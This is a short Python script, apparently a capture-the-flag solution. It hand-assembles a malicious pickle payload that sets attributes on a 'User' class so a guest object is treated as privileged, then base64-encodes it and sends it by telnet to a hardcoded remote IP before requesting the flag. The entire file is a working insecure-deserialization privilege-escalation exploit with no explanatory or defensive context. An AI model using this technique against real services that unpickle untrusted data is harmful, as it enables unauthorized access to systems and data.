import codecs
from telnetlib import Telnet


p  = b''
p += b'\x80\x02'        # protocol: 2
p += b'cstructs\nUser\n'   # from structs import User
p += b'q\x00'           # memo[0] = User
p += b')\x81'   # push User()
p += b'}' # start attrs
p += b'S"name"\nS"guest"\ns' # u.name = 'guest'
p += b'S"group"\nS"guest"\ns' # u.group = 'guest'
p += b'b' # end attrs
p += b'q\x02'           # memo[2] = User()

p += b'h\x00' # obj = User
p += b'N}S"__set__"\n' # key = __set__
p += b'h\x00' # value = User
p += b's\x86b' # User.__set__ = User

p += b'h\x00' # obj = User
p += b'N}S"privileged"\n' # key = privileged
p += b'h\x02' # value = User()
p += b's\x86b' # User.privileged = User()

p += b'h\x02' # return User()

p += b'.'

p = codecs.encode(p, 'base64')
p = p.replace(b'\n', b'')


# r = Telnet('localhost', 5423)
r = Telnet('18.206.151.29', 5423)
r.write(p + b'\n')
r.write(b'flag\n')
r.interact()
